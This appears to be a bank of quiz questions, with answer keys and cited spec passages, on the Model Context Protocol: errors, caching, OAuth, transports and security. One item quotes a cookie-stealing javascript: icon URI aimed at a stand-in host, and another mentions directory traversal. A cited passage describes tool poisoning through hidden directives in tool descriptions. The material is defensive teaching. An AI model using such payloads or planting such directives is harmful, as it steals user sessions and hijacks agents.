q.en: A manifest reviewer sees a tool definition whose name is get_forecast and whose title is Get 7-Day Forecast. Which field must a client send as params.name when it calls this tool, and what is the other field for?

o.en: Neither one, since tools/call identifies a tool by its position in the tools/list array
title in params.name, since title is the canonical identifier and name is a display hint
name in params.name, since name is the programmatic identifier and title is for display
Either one, since servers resolve a call by matching name and title interchangeably

x.en: Tool metadata separates a programmatic name, which clients send in params.name on tools/call, from an optional human-readable title that hosts show in their user interfaces. Calling by title, or by position in the list, breaks as soon as the display text or the ordering changes.

cite.text: `title`: A human-readable display name for the tool that clients can show to users

q.en: In the model interaction flow, a host is about to let the model call a tool annotated as destructive. Where does the host's confirmation step belong in that flow?

o.en: Only inside the server, since the host has no visibility into tool annotations
Inside the model's own hidden reasoning, invisible to the host
After the server has already executed the tool, as a post-hoc notice
Before the client sends tools/call, so a human can approve or deny the action

x.en: The interaction flow places human confirmation of sensitive calls before the client actually sends the request, so a destructive action can be denied rather than merely logged afterward. The host reads the tool's annotations and inputs to decide whether to prompt.

cite.text: Clients SHOULD: - Prompt for user confirmation on sensitive operations - Show tool inputs to the user before calling the server, to avoid malicious or accidental data exfiltration - Validate tool results before passing to LLM - Follow the `$ref` resolution requirements when validating tool inputs and outputs against `inputSchema` and `outputSchema` - Implement timeouts for tool calls - Log tool usage for audit purposes

q.en: A platform team runs one MCP server locally over stdio for filesystem access and a second MCP server remotely over Streamable HTTP for a SaaS integration. A reviewer claims both servers share one trust boundary because the host treats them the same way in its tool registry. What is the correct correction?

o.en: The trust boundary follows the process and network boundary, so the two servers sit in different trust domains
Trust boundaries are set entirely by which capabilities a server declares in its discover result
Both servers share one trust boundary as long as they expose tools with different names
Only the remote HTTP server has a real trust boundary, since a local subprocess is inherently trusted

x.en: Trust domains follow process and network boundaries rather than how a host happens to list tools, so a local stdio subprocess and a remote HTTP service are separate trust domains even when the host aggregates both into one registry. Naming and declared capabilities do not redraw that boundary.

cite.text: Note that MCP server refers to the program that serves context data, regardless of where it runs. MCP servers can execute locally or remotely. For example, when Claude Desktop launches the filesystem server, the server runs locally on the same machine because it uses the STDIO transport. This is commonly referred to as a "local" MCP server. The official Sentry MCP server runs on the Sentry platform, and uses the Streamable HTTP transport. This is commonly referred to as a "remote" MCP server.

q.en: A client is deciding when it must call server/discover before using a server. Which two statements about discovery are correct? Select two.

o.en: Servers may entirely skip implementing server/discover whenever they only expose a single simple tool overall
Calling server/discover is optional for a client, since it may send a request directly and handle a version error
A DiscoverResult must always be answered before any other kind of request is allowed to be sent at all
The instructions field returned by discover is natural-language guidance for the model, not a machine-checked contract

x.en: Discovery is optional for clients but mandatory for servers to implement, and a DiscoverResult's instructions field is descriptive guidance for the model rather than an enforced contract. No request ordering requires discover to run first, and skipping it is never conditioned on a server's tool count.

cite.text: Clients that want to select a version up front can call `server/discover`, a mandatory RPC that returns the server's supported protocol versions, capabilities, and identity in a single request. Calling it is optional: a client is free to send any request directly and handle a version error if one comes back.

q.en: A tool's inputSchema has no $schema keyword at all, and the client team's validator library defaults to an older JSON Schema draft. Which dialect should the client apply when validating arguments against this schema?

o.en: Whatever dialect the validator library defaults to, since MCP leaves the choice open
JSON Schema 2020-12, since MCP makes it the default dialect when $schema is absent
Draft-04, since it remains the most widely deployed JSON Schema dialect in libraries
Draft-07, since most early MCP servers were written against that particular draft

x.en: MCP schemas default to the JSON Schema 2020-12 dialect when they carry no $schema keyword, so a validator must apply 2020-12 semantics instead of its own library default or an older draft. A schema that needs another dialect has to declare it explicitly with $schema.

cite.text: This SEP establishes JSON Schema 2020-12 as the default dialect for embedded schemas within MCP messages (tool `inputSchema`/`outputSchema` and elicitation `requestedSchema` fields). Schemas may explicitly declare alternative dialects via the `$schema` field. This resolves ambiguity that has caused compatibility issues between implementations.

q.en: A host rebuilds its tool list for the model on every turn, but the order of tools within that list changes randomly each time based on dictionary iteration order in the host's own code. A teammate says this is harmless. Why is it actually a problem?

o.en: It is a problem only because JSON object keys are technically unordered in the specification
It is a problem only because the model refuses to call any tool that is not listed first
tools/list results should be deterministically ordered, and random ordering defeats client and LLM prompt-cache hits
It is not a problem, since tool order has no effect on caching or on anything the model does

x.en: Tool listings should be deterministically ordered so that client-side caching and the model provider's own prompt caching can recognize a stable, repeated prefix. Randomizing the order breaks that stability even though the set of tools and their definitions have not actually changed.

cite.text: Servers SHOULD return tools in a deterministic order (i.e., the same ordering across requests when the underlying set of tools has not changed). Deterministic ordering enables clients to reliably cache the tool list and improves LLM prompt cache hit rates when tools are included in model context.

q.en: A tool's result needs to hand back an image the model should reason about plus a pointer to a large log file the model should not have to read in full. Which combination of content blocks fits both needs?

o.en: Two text blocks, one describing the image and one describing the log file
An audio content block for the image and a text block for the log file
A single embedded resource block containing both the image bytes and the entire log file text
An image content block for the picture, plus a resource_link pointing at the log file

x.en: An image content block carries visual data the model can reason about directly, while a resource_link gives the model a reference to a resource, such as a large file, without forcing its full content into context. Using audio for an image would misrepresent the content type.

cite.text: Content Types: Each content object has a `type` field. In this example, `"type": "text"` indicates text content. Tool results can also contain images (`image`), audio (`audio`), resource links (`resource_link`), and embedded resources (`resource`). Not every model accepts all of these types, so clients may need to handle content that their model does not support.

q.en: An MCP server exposes internal documents through file:// resource URIs. A security reviewer worries this lets a crafted URI like file:///etc/passwd walk outside the intended document tree. What must a compliant server do about this?

o.en: Sanitize file paths to prevent directory traversal, a check the specification requires of servers
Nothing, since the file:// scheme is only ever reachable by already-trusted local clients
Reject file:// entirely, since 2026-07-28 only permits https:// and git:// resource URIs
Allow it, since resources/read already restricts every caller to their own home directory

x.en: The resources specification requires servers to validate every resource URI and to sanitize file paths to prevent directory traversal attacks. A file:// URI need not map to a physical filesystem at all, but when it does, the server owns the check before any path touches disk, rather than trusting the caller or the transport.

cite.text: Servers MUST validate all resource URIs 2. Access controls SHOULD be implemented for sensitive resources 3. Binary data MUST be properly encoded 4. Resource permissions SHOULD be checked before operations 5. Servers MUST sanitize file paths to prevent directory traversal attacks when serving `file://` resources

q.en: A client calls prompts/get for a real prompt name but omits an argument the prompt declares as required. What should the server return?

o.en: A successful PromptMessage list with the missing argument left as an empty string
A JSON-RPC error with code -32602 for the missing required argument
A tool execution error with isError true, since prompts share the tools error channel
A JSON-RPC error with code -32601, since the prompt itself could not be found

x.en: Both an invalid prompt name and a missing required argument are protocol errors coded -32602 under the current allocation, distinct from the tool execution error channel that applies to tools, and distinct from -32601 which means the method itself is unrecognized.

cite.text: A request missing any required field is malformed; the server MUST reject it with JSON-RPC error code `-32602` (Invalid params). On HTTP, the response status MUST be `400 Bad Request`.

q.en: A deploy tool needs the user to confirm a risky action before it proceeds. Under the 2026-07-28 message patterns, how does the server ask for that confirmation?

o.en: It opens a brand-new subscriptions/listen stream and waits there for the user's eventual final answer
It simply pauses the response indefinitely until the user answers somehow out of band
It returns a result with resultType input_required, carrying inputRequests or requestState to answer
It sends a brand-new server-initiated request straight to the client mid-call

x.en: Multi round-trip requests replaced server-initiated requests entirely, so a server that needs input answers the original call with an input_required result carrying at least one of inputRequests or requestState, which the client answers by retrying the same logical request with a new id.

cite.text: *Server-to-client interactions (MRTR). When the server needs input from the client — sampling, elicitation, or roots — it does not send its own JSON-RPC request. It returns an [`InputRequiredResult`][input-required-result] containing `inputRequests`, and the client retries the original request with the matching `inputResponses` (see [Multi Round-Trip Requests][mrtr]):

q.en: A server currently asks the client to run a completion through the client's own model using sampling create message. A migration review flags this as deprecated. What is the recommended replacement?

o.en: Keep using it forever, since deprecated features never actually change
Replace it with roots/list, since roots and sampling share the same migration path
Replace it with subscriptions/listen so the client streams the completion as resource updates
Switch the server to call an LLM provider's API directly rather than through the client

x.en: Sampling is deprecated in 2026-07-28, and its documented migration is for the server to call a large language model provider's API directly rather than asking the client to run a completion on its behalf. It remains functional but is not the forward path.

cite.text: Sampling: Integrate directly with LLM provider APIs. The protocol does not define a replacement for requesting completions through the client.

q.en: An MCP client's stdio connection to a server crashes partway through a conversation, and the client automatically restarts the server subprocess. Before the crash, the client had an active subscriptions/listen stream watching for tool list changes. What must the client do after the restart to keep receiving those notifications?

o.en: Re-send a new subscriptions/listen request, since the previous stream did not survive the crash and restart
Nothing, since the server automatically remembers and resumes the previous listen stream on its own
Send notifications/cancelled first, since that is what reopens a listen stream after a crash
Wait for the server to proactively re-establish the stream using the old subscriptionId value

x.en: A stdio subprocess restart discards whatever the previous process was tracking, including an open listen stream, so the client is responsible for re-issuing subscriptions/listen after it restarts the server, the same way it retries other lost requests rather than waiting on the server to reconnect on its own.

cite.text: If the server process exits unexpectedly, the client SHOULD restart it. Because the protocol is stateless, any in-flight requests are simply lost and the client can retry them against the fresh process. Active [`subscriptions/listen`][subscriptions-listen] streams must also be re-established after restart.

q.en: An operator debugging a failed tool call sees a JSON-RPC error with code -32602 rather than a result with isError true. Which situation matches that response shape?

o.en: The arguments were well formed but failed a business rule enforced by the tool's own logic
The request named a tool that does not exist on this server
An external API the tool depends on returned a failure
The arguments failed validation against the tool's declared inputSchema

x.en: An unknown tool name is a protocol-level failure returned as a JSON-RPC error coded -32602, while schema-invalid arguments, business rule rejections, and downstream API failures are all represented as tool execution errors, a normal result with isError true, so the model can see and react to them.

cite.text: Protocol Errors indicate issues with the request structure itself that models are less likely to be able to fix: Unknown tool; Malformed requests; Server errors. They are returned as standard JSON-RPC errors (example: code -32602, "Unknown tool: invalid_tool_name").

q.en: A code reviewer sees a pull request that returns a JSON-RPC -32602 error whenever a tool's arguments fail a business rule, such as a discount percentage over the allowed maximum. What should the reviewer flag?

o.en: That the code should use -32002, since that is the correct code for invalid business input
That the code should use -32601 instead, since the tool method itself is unknown
That business rule failures should instead be a tool execution error with isError true
Nothing, since business rule violations are exactly what -32602 exists for

x.en: Input validation and business logic failures are tool execution errors returned as a normal result with isError true, not JSON-RPC protocol errors, because that channel lets the failure content flow back into the model's context so it can adjust its arguments.

cite.text: Language models can learn from tool input validation error messages and retry a tools/call with corrected parameters accordingly, but only if they receive the error feedback in their context window. Protocol Errors are catch at the application level by the MCP Client. Only Tool Execution Errors are forwarded back to the model as JSON-RPC responses. With the current specifications, models cannot see these error messages and thus cannot self-correct, leading to repeated failures and poor user experiences.

q.en: A gateway in front of several MCP servers receives a POST whose MCP-Protocol-Version header does not match the protocolVersion value inside the request's metadata. What should the gateway do?

o.en: Ignore the header and trust only the value inside the request body
Silently rewrite the header to match the body before forwarding it
Forward the request as is, since headers are advisory hints only
Reject the request with HTTP 400 and the HeaderMismatch error code

x.en: Streamable HTTP requires the MCP-Protocol-Version header to equal the version carried in the request metadata, and a disagreement between the header and the body is exactly the condition the HeaderMismatch error exists to report, returned as HTTP 400 with JSON-RPC code -32020.

cite.text: Any server that processes the message body MUST validate that encoded header values, after decoding if Base64-encoded, match the corresponding values in the request body. Servers MUST reject requests with a `400 Bad Request` HTTP status and JSON-RPC error code `-32020` (`HeaderMismatch`) if any validation fails.

q.en: A host developer is deciding what to cache from a slow-changing MCP server to cut latency for the agent's next turn. Which two practices match the 2026-07-28 caching model? Select two.

o.en: Invalidate a cached list immediately on receiving the matching list_changed notification rather than waiting out the ttlMs
Cache an input_required result the same way as any other complete result, since it saves a round trip
Treat cacheScope public as proof that the data is safe to show to any user, regardless of what the request required
Partition private cacheScope entries by authorization context so cached results never cross between users

x.en: Private cache entries must never cross authorization contexts, and a list_changed notification invalidates a cached list immediately regardless of its remaining ttlMs, since ttlMs is only a freshness hint. cacheScope is never an access control, and MRTR input_required results are never cached.

cite.text: When a relevant notification is received while a cached response is still fresh, the notification invalidates the cached response and it should be considered immediately stale.

q.en: A team is building a report-generation tool that can take anywhere from a few seconds to twenty minutes depending on the report size, and the client may disconnect and reconnect during that time. Which approach fits best?

o.en: Return the report through the tasks extension, so the client can poll and reconnect using a taskId
Use a server-minted handle and have the client poll resources/read on a fixed schedule
Use MRTR and treat the entire twenty-minute wait as one input_required round trip
Always answer with a plain complete result and let the HTTP connection stay open for twenty minutes

x.en: Long, unpredictable work that must survive disconnection is exactly what the tasks extension is for: the server answers with a task result carrying a taskId, and the client polls tasks/get and can resume tracking it after a reconnect, unlike a single held-open response or an MRTR round trip meant for one input exchange.

cite.text: Not every tool call returns instantly. Some operations — CI pipelines, batch processing, human approvals — take seconds, minutes, or longer. MCP Tasks let servers return a durable handle instead of blocking, so clients can poll for progress, provide input when needed, and retrieve the final result after reconnecting.

q.en: An operator sees a tool call that was cancelled by the client, but a late result for that same call arrives from the server moments later. What is the correct handling?

o.en: Retry the same request id to force the server to resend the cancellation acknowledgment
Discard the late result, since races after cancellation are expected and should be ignored
Reject the entire connection, since a late result after cancellation means the server is broken
Treat the late result as authoritative and apply it as if cancellation never happened

x.en: Cancellation is inherently racy: a response can be in flight when the cancellation is sent, so a late response to an already-cancelled request is expected and should simply be ignored rather than applied, escalated as a defect, or retried under the same id.

cite.text: Due to network latency, cancellation notifications may arrive after request processing has completed, and potentially after a response has already been sent.: Both parties MUST handle these race conditions gracefully:

q.en: A server returns an InputRequiredResult whose inputRequests map uses the keys confirm_deploy and pick_region, with no requestState. How must the client shape its retry of the original tools/call?

o.en: Send inputResponses under keys of the client's choosing, plus an empty requestState string
Send only the answer to the first key, since a server asks one question per round trip
Send inputResponses under the same two keys the server chose, and omit requestState
Send the answers in a new elicitation/create request instead of retrying the original call

x.en: The retry repeats the original request with a new id and adds inputResponses under exactly the keys the server chose in inputRequests, so the server can match each answer to its question. requestState is echoed only when the server supplied one; a client must not invent it or send an empty value.

cite.text: An `InputRequests` object is a map of server-client requests. Keys are server-assigned string identifiers; values are request objects (e.g., `ElicitRequest`, `CreateMessageRequest`, or `ListRootsRequest`).: #### InputResponses

q.en: A team is migrating a legacy server that still expects an initialize handshake to the 2026-07-28 wire format. During the transition, a dual-era client sends a modern request directly over stdio and the server responds with something other than a DiscoverResult or a recognized modern error. What should the client conclude?

o.en: The server is modern but temporarily overloaded, so the client should keep retrying the same request
The server must have crashed, so the client should restart the subprocess immediately
The server rejected the specific protocol version, so the client should retry using the supported list
The server is legacy, so the client should fall back to the initialize handshake

x.en: On stdio, an unrecognized error or a timeout in response to a modern probe means the server is legacy and the client should fall back to the initialize handshake, while a recognized modern error such as UnsupportedProtocolVersion would instead mean modern with a different version, never a blind fallback keyed on one code.

cite.text: The server returns a `DiscoverResult`: the server is modern. Select a mutually supported version from `supportedVersions` and continue. - The server returns a recognized modern JSON-RPC error such as [`UnsupportedProtocolVersionError`][unsupported-version]: the server is modern but does not support the requested version. Use one of the versions in its advertised `supported` list. Do not fall back to `initialize`. - The server returns any other error, or does not respond within a reasonable timeout: the server is legacy. Fall back to the `initialize` handshake.

q.en: A gateway operator is configuring which HTTP headers must be present on every request POSTed to a 2026-07-28 MCP endpoint. Which two headers are required by the specification? Select two.

o.en: Mcp-Session-Id, to keep requests bound to the same session
MCP-Protocol-Version, matching the version carried in the request's metadata
Mcp-Method, naming the JSON-RPC method the request carries
Last-Event-ID, to support resuming a dropped stream

x.en: Streamable HTTP requires MCP-Protocol-Version on every request, matching the version in the request's metadata, and Mcp-Method naming the request's method so intermediaries can route without parsing the body. Mcp-Session-Id and Last-Event-ID belonged to the removed session and stream-resumability mechanisms and no longer apply.

cite.text: The Streamable HTTP transport mirrors selected JSON-RPC body fields into HTTP headers so that intermediaries (load balancers, gateways, observability tooling) can route and inspect requests without parsing the body.

q.en: A team reviewing the tasks extension wants to confirm which statuses a task can report while the client polls tasks/get. Which two are real statuses in the 2026-07-28 design? Select two.

o.en: cancelled, used when a cooperative tasks/cancel request succeeded
input_required, used when the task needs an answer before it can continue
queued_for_review, used whenever a human must approve the task before it starts
retrying, used automatically whenever the underlying tool call throws an exception

x.en: The tasks extension defines the statuses working, input_required, completed, failed, and cancelled, so a task can pause for mid-flight input or end because a cooperative cancel request succeeded. There is no separate queued_for_review or automatic retrying status in the redesigned extension.

cite.text: Progress visibility. Tasks carry status metadata (`working`, `input_required`, `completed`, `failed`, `cancelled`) and optional status messages, giving clients visibility into progress.

q.en: A host offers one-click setup: a user pastes a configuration snippet from a web page, and the host can start the local stdio server it describes. What must the host do before it runs that server's command?

o.en: Show the exact command untruncated, flag it as code execution, and require explicit approval
Run the command in the model's sandbox, since the model recommended the configuration
Ask the server for its serverInfo first, and run it only if the reported name looks legitimate
Run the command at once, since a local stdio server sits inside the host's own trust zone

x.en: One-click local configuration executes code on the user's machine, so the specification's security guidance requires the client to show the exact command without truncation, identify it as a potentially dangerous operation, require explicit approval, and let the user cancel. Being local does not make a pasted command trustworthy, and self-reported serverInfo proves nothing about it.

cite.text: Show the exact command that will be executed, without truncation (include arguments and parameters) - Clearly identify it as a potentially dangerous operation that executes code on the user's system - Require explicit user approval before proceeding - Allow users to cancel the configuration

q.en: A client calls an MCP server over HTTP without a token and receives a 401 response. How is the client expected to discover which authorization server issues tokens for this resource?

o.en: By asking the end user to paste in the authorization server's URL from memory
By reading the WWW-Authenticate header's resource_metadata value or the well-known metadata paths
By reading the server's self-reported serverInfo field returned from the server/discover call instead
By simply guessing common authorization server domains until one finally accepts the client

x.en: A 401 response should carry a WWW-Authenticate challenge with a resource_metadata value, or the client falls back to the well-known Protected Resource Metadata paths, both of which point at Protected Resource Metadata naming the authorization servers, rather than relying on guesses or self-reported serverInfo.

cite.text: When a client sends a request without a valid token, your server responds with `401 Unauthorized`. The `WWW-Authenticate` header can point to the Protected Resource Metadata (PRM) document. It should also name the scopes needed to access the resource.

q.en: A command-line MCP client meets an authorization server that does not advertise Client ID Metadata Document support, so it falls back to Dynamic Client Registration with a localhost redirect URI. Which application_type must its registration request carry?

o.en: service, since command-line tools register as unattended machine-to-machine clients
web, since every OAuth client that completes a browser redirect counts as a web application
native, since desktop, command-line, and localhost clients register as native applications
none, since application_type is optional metadata that authorization servers ignore

x.en: A client that falls back to Dynamic Client Registration must send application_type: native for desktop, command-line, and localhost clients, and web for remote browser-based clients, so the authorization server applies the right redirect URI rules. Dynamic Client Registration is itself deprecated in favor of Client ID Metadata Documents but remains the fallback when those are not advertised.

cite.text: Native applications (desktop applications, mobile apps, CLI tools, and locally-hosted web applications accessed via `localhost`) SHOULD use `application_type: "native"`

q.en: A user approves a destructive delete_record tool call after reviewing its arguments. Moments later in the same turn, the model wants to call a different destructive tool, archive_record. Does the earlier approval cover this new call?

o.en: Yes, since one destructive-tool approval covers every destructive tool for the rest of the turn
Yes, but only because both tool names share a common record-related prefix
No, but only because archive_record happens to have a longer name than delete_record
No, each sensitive tool call needs its own consent, so approving one destructive tool does not approve another

x.en: Consent is scoped per invocation rather than granted blanket for a session, so approving one destructive call does not extend to a different tool even later in the same turn. Shared naming or relative name length have no bearing on whether consent transfers between tools.

cite.text: Per-call authorization: The broker is still the MCP host for spec purposes. Apply the same human-in-the-loop confirmation policy to sandbox-originated calls that you apply to direct calls (see Tools: Security). Approving the script does not grant blanket approval for every tool call it makes at runtime; hosts may grant categorical approval (for example, "allow `ticketing_createIssue` for this script run") rather than prompting per iteration, but the broker must still evaluate each call against that grant.

q.en: A security owner reviewing a new server finds a tool whose icons entry has src set to javascript:fetch('https://collect.example/'+document.cookie). What must a client that renders icons do with this icon?

o.en: Reject it, since icon URIs must be HTTPS or data: and unsafe schemes such as javascript: are refused
Render it, since icons are cosmetic metadata that never execute inside a host's interface
Render it only after the model confirms the icon matches the tool's stated purpose
Rewrite the javascript: scheme to https: automatically and then fetch the new address

x.en: Icon metadata is untrusted server input. The specification requires consumers to accept only HTTPS or data: icon URIs, to reject unsafe schemes and redirects such as javascript:, and to treat fetched payloads such as SVG as potentially executable. Rewriting the scheme or asking the model does not make an attacker-controlled URI safe.

cite.text: Ensure that the icon URI is either a HTTPS or `data:` URI. Clients MUST reject icon URIs that use unsafe schemes and redirects, such as `javascript:`, `file:`, `ftp:`, `ws:`, or local app URI schemes.

q.en: An incident review needs to trace one failed tool call across the host, the client, and the server that executed it. What mechanism is designed to carry that correlation across the hops?

o.en: The JSON-RPC id, since request ids are guaranteed unique across the entire system forever
OpenTelemetry trace context carried in request metadata as traceparent, tracestate, and baggage
The clientInfo field, since it is always self-reported by the client on every single outgoing request
The cacheScope field, since it supposedly labels which requests belong to the same trace

x.en: W3C Trace Context and Baggage fields travel in request metadata as traceparent, tracestate, and baggage specifically so a request can be correlated across host, client, server, and upstream hops, unlike clientInfo which is display only or cacheScope which governs caching, not tracing.

cite.text: `traceparent`, `tracestate`, `baggage` | OpenTelemetry trace context propagation | OpenTelemetry trace context (below)

q.en: A server that the organization has not vetted lists a tool whose annotations claim readOnlyHint true and destructiveHint false. Should a host let the model skip its usual confirmation step for that tool based on those annotations alone?

o.en: No, but only because destructiveHint defaults to false and cannot be overridden
Yes, because annotations are enforced guarantees the server cannot misreport
No, annotations are hints and must be treated as untrusted unless the server is trusted
Yes, but only if the annotations were also repeated inside the tool's own description text

x.en: Tool annotations are hints, not enforced guarantees, and must be treated as untrusted input unless the server providing them is itself trusted, so a host should not waive its confirmation step for an unvetted server purely because the annotations look reassuring.

cite.text: Tool Safety - Tools represent arbitrary code execution and must be treated with appropriate caution. - In particular, descriptions of tool behavior such as annotations should be considered untrusted, unless obtained from a trusted server. - Hosts must obtain explicit user consent before invoking any tool - Users should understand what each tool does before authorizing its use

q.en: A user clicks Authorize and is redirected back with an authorization response, but the issuer named in that response does not match the issuer the client recorded before redirecting. What must the client do?

o.en: Accept the response, but only after normalizing both issuer strings to lowercase first
Accept the response, since the authorization code itself is proof enough of a valid issuer
Accept the response anyway, since the issuer only matters for error responses, not successful ones
Reject the response as a mismatch, even though the rest of the exchange otherwise looks successful

x.en: Issuer validation defends against mix-up attacks: the client records the expected issuer before redirecting and compares the returned issuer exactly, with no normalization, rejecting any mismatch including on responses that otherwise look like success, since a valid-looking code from the wrong issuer is exactly the attack this check catches.

cite.text: Before redirecting the user-agent, the client MUST record the `issuer` value from the selected authorization server's validated metadata document (see Authorization Server Metadata Discovery) and associate it with the same per-request record used to store the PKCE code verifier (and the `state` value, if used). The validation in this section depends on that recorded value being authentic; it provides no protection if the expected issuer was obtained from an unvalidated source.

q.en: A server exposes a tool that calls an expensive external search API. Without any limits, a single misbehaving client could exhaust the server's quota for every other user. What control most directly addresses this?

o.en: Per-tool rate limiting on the server side, independent of what the client claims to need
Moving the rate limit into the tool's own description text as an instruction to the model
Increasing the tool's timeout so retries happen less often
Relying on the client's own idempotentHint declaration to slow down repeated calls

x.en: Servers are expected to enforce their own rate limits regardless of what a client declares, since a client-side hint or a longer timeout does nothing to stop a determined or buggy caller, and a limit written only into a description is advisory text the model may ignore.

cite.text: Servers MUST: Validate all tool inputs; Implement proper access controls; Rate limit tool invocations; Sanitize tool outputs.

q.en: A team is designing its audit logging for MCP tool calls. A reviewer objects that the draft design logs the full raw arguments of every call, including free-text fields a user might paste sensitive data into. What should the design change to?

o.en: Stop logging arguments at all, so the audit trail only records that some call happened
Redact or omit sensitive argument content so audit records never carry credentials, secrets, or personal data
Encrypt the arguments with a key stored next to the log, so any reader can decrypt them
Log the full raw arguments anyway, since audit completeness always fully outweighs any data sensitivity concerns

x.en: Audit and observability practice requires that logs never contain credentials, secrets, or personal data, so sensitive argument content should be redacted or omitted while still preserving enough structure, such as method, tool name, and correlation ids, to support tracing and attribution.

q.en: An MCP proxy uses one static client id when talking to third-party authorization servers on behalf of many different downstream clients. What additional step does this design require to avoid a confused deputy problem?

o.en: The proxy should stop validating redirect URIs, since the static client id already vouches for them
The proxy should reuse the same authorization code across all downstream clients to simplify the flow
The proxy must obtain user consent for each dynamically registered client before forwarding it onward
None, since a single static client id already isolates each downstream client automatically

x.en: A proxy that presents one static client id to an authorization server on behalf of many dynamically registered clients must obtain explicit user consent for each one before forwarding, since without that step the authorization server cannot distinguish which downstream client is actually acting.

cite.text: MCP proxy servers using static client IDs MUST obtain user consent for each dynamically registered client before forwarding to third-party authorization servers (which may require additional consent).

q.en: A workflow only needs to read a customer's order history, but the team is about to grant it a scope that also allows placing and cancelling orders. What principle should push back on that request?

o.en: Statelessness, since order history is state that clearly spans multiple requests
Cache scope, since public and private caching require entirely different access permissions
Idempotency, since placing a new order is not an idempotent operation at all
Least privilege, since the workflow should be granted only the access its task requires

x.en: Least privilege means granting only the access a task actually needs, so a read-only history workflow should receive a read-only scope rather than a broader one that also allows placing or cancelling orders, independent of idempotency, statelessness, or caching considerations that do not bear on this decision.

cite.text: When implementing authorization flows, MCP clients SHOULD follow the principle of least privilege by requesting only the scopes necessary for their intended operations. During the initial authorization handshake, MCP clients SHOULD follow this priority order for scope selection:

q.en: A policy engine is scoring a candidate server for known MCP attack surfaces before it is approved. Which three are real threats the engine should score for? Select three.

o.en: Cache staleness, where a ttlMs value of zero simply means a result is treated as stale immediately
Tool poisoning through a description that contains hidden instructions aimed at the model
Confused deputy behavior in a proxy that forwards to a third-party authorization server using one static client id
Rug pulls, where a previously approved tool's definition silently changes after approval

x.en: Tool poisoning, rug pulls, and confused deputy proxy behavior are documented threats with specific mitigations such as output sanitization, definition pinning, and per-client consent. A ttlMs of zero simply means the result is treated as stale immediately, which is a caching detail rather than a security threat.

cite.text: A poisoned tool catalog. Tool names and descriptions are instructions your model reads. A server can hide directives in them that steer the agent — including how it uses _other_ servers' tools — without the poisoned tool ever being invoked (often called tool poisoning, or tool shadowing when it targets another server's tools). Definitions are not fixed at install time either: a server can quietly change them after you approved it (a rug pull), so a one-time consent dialog and package pinning do not cover this surface.

q.en: A team is checking their MCP client's OAuth implementation against the 2026-07-28 authorization requirements. Which three practices are actually required? Select three.

o.en: Send the bearer token in the Authorization header on every HTTP request, never in the query string
Send the resource parameter identifying the canonical server URI on both the authorization and token requests
Use PKCE with S256 when the client is capable of it
Store a long-lived refresh token locally and assume one will always be issued

x.en: Bearer tokens belong only in the Authorization header, PKCE with S256 is mandatory when supported, and Resource Indicators must be sent on both the authorization and token requests. A refresh token should never be assumed, since public clients' refresh tokens rotate and one may not be issued at all.

cite.text: MCP client MUST use the Authorization request header field defined in OAuth 2.1 Section 5.1.1:

q.en: A team is drawing a responsibility matrix for a new remote MCP deployment. Who is the right owner for implementing Protected Resource Metadata and validating token audience?

o.en: The server author, since these are requirements on the resource server itself
The registry publisher, since Protected Resource Metadata is part of server.json
The end user, since they are the one granting consent
The gateway operator only, and never the server author

x.en: Protected Resource Metadata and audience validation are requirements on the MCP server acting as an OAuth resource server, so the server author owns implementing them, distinct from the end user's consent role, the registry publisher's metadata role, or a gateway operator who may add further enforcement but does not replace this duty.

cite.text: MCP servers, acting in their role as an OAuth 2.1 resource server, MUST validate access tokens as described in OAuth 2.1 Section 5.2. MCP servers MUST validate that access tokens were issued specifically for them as the intended audience, according to RFC 8707 Section 2. If validation fails, servers MUST respond according to OAuth 2.1 Section 5.3 error handling requirements. Invalid or expired tokens MUST receive an HTTP 401 response.

q.en: A team exposes a prompt that takes a repository argument, and users keep mistyping repository names in the host's form. Which MCP capability lets the host suggest valid values while the user types?

o.en: A subscriptions/listen stream that pushes every repository name to the client in advance
The completion/complete request, which returns suggested values for a prompt argument
An elicitation/create request that the host sends to the server for every character typed
A resources/list call on every keystroke, filtered by the host down to repository names

x.en: Argument completion is the utility built for this: the host calls completion/complete with a reference to the prompt and the partial argument value, and the server returns up to 100 suggested values. Listing resources or streaming notifications is not a completion mechanism, and elicitation is a server request for user input, not a host lookup against the server.

cite.text: `completion/complete` | Suggest argument values | Array of suggested values

q.en: A third-party extension published as com.example/my-extension makes a breaking change to its wire format. The maintainer wants integrations built against the old behavior to keep working unmodified. What should the maintainer do?

o.en: Keep the same identifier, since extension identifiers are versioned automatically behind the scenes
Remove the old identifier entirely so no client can accidentally negotiate the outdated behavior
Publish the breaking change under a new identifier, such as com.example/my-extension-v2, rather than reusing the old one
Keep the same identifier, since every client is required to renegotiate extensions on each request anyway

x.en: A breaking change to an extension needs a new identifier so old and new behavior can be negotiated and run side by side, since identifiers are not automatically versioned and removing the old one outright would break every integration still relying on it instead of only the ones that opt in.

cite.text: Breaking changes keep the extension's identifier. A new identifier (e.g., `io.modelcontextprotocol/my-extension-v2`) is used only when old and new behavior must coexist under one protocol revision.

q.en: An MCP Apps interface asks for camera access by including camera in its permissions metadata, and the app's developer assumes the camera will now be available inside the sandboxed iframe. Is that assumption correct?

o.en: No, because permissions metadata only ever applies to network access, never device hardware
Yes, but only for microphone and geolocation, never specifically for camera
Yes, since declaring a permission in that metadata field is what grants it immediately
No, since the host may honor a requested permission but the app should never assume it was actually granted

x.en: Permissions such as camera, microphone, geolocation, and clipboardWrite are requests the host may choose to honor, not guarantees, so a well-behaved app treats a declared permission as optional and checks at runtime rather than assuming the capability is present just because it was requested.

cite.text: Sandboxed rendering: Web hosts typically render the HTML inside a sandboxed iframe within the conversation. The sandbox restricts the app's access to the parent page, ensuring security. The resource's `_meta.ui` object can include `permissions` to request additional capabilities (e.g., microphone, camera) and `csp` to control what external origins the app can load resources from.

q.en: A platform team is putting a gateway in front of several internal MCP servers so client requests can be routed without the gateway parsing every request body. What should the gateway route on?

o.en: The Mcp-Method and Mcp-Name headers, validating them against the body rather than trusting them blindly
The clientInfo field inside the request metadata, since it uniquely identifies which server should handle the request
The JSON-RPC id, since ids encode which server originally issued them
The cacheScope field, since it was designed to carry routing information

x.en: The required headers exist precisely so a gateway can route and enforce policy without parsing every body, but it must still validate that the headers agree with the body and reject a mismatch, rather than routing on clientInfo, which is self-reported, or on fields never meant for routing.

cite.text: Intermediaries that enforce policy based on mirrored headers (e.g., routing or rate-limiting by tenant) SHOULD verify that the `MCP-Protocol-Version` header indicates a version that requires header–body validation. If the version is older or the header is absent, the intermediary SHOULD reject the request rather than trusting unvalidated header values.

